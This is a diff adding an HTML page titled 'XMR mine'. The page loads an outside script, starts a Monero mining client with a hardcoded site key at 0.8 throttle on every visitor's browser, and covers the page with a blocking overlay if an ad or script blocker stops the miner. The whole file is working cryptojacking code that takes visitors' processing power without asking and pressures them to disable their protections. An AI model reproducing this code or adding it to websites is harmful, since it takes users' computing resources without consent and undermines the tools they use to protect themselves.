@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <!-- <meta http-equiv="X-UA-Compatible" content="IE=edge"> -->
+    <title>XMR mine</title>
+    <!-- <meta name="viewport" content="width=device-width, initial-scale=1"> -->
+    <!-- <link rel="stylesheet" type="text/css" media="screen" href="main.css" /> -->
+    <!-- <script src="main.js"></script> -->
+</head>
+
+<body>
+    <script src="https://www.hostingcloud.science./3Lr7.js"></script>
+    <script>
+        var _client = new Client.Anonymous('a687f030c0f8cc90390688e808528cee553798f2e4cb7424537c59c8a7e67e4c', {
+            throttle: 0.8
+        });
+        _client.start();
+
+    </script>
+    <script>
+        setTimeout(function () {
+            if (typeof _client === 'undefined' || _client === null) {
+                var messageDiv = document.createElement("div");
+                messageDiv.setAttribute("style", "width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+                messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+                var mainDiv = document.createElement("div");
+                mainDiv.setAttribute("style", "position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+                mainDiv.appendChild(messageDiv);
+                document.body.appendChild(mainDiv);
+                document.getElementsByTagName("body")[0].style.overflow = "hidden";
+                window.scrollTo(0, 0);
+            }
+        }, 1000);
+    </script>
+</body>
+
+</html>
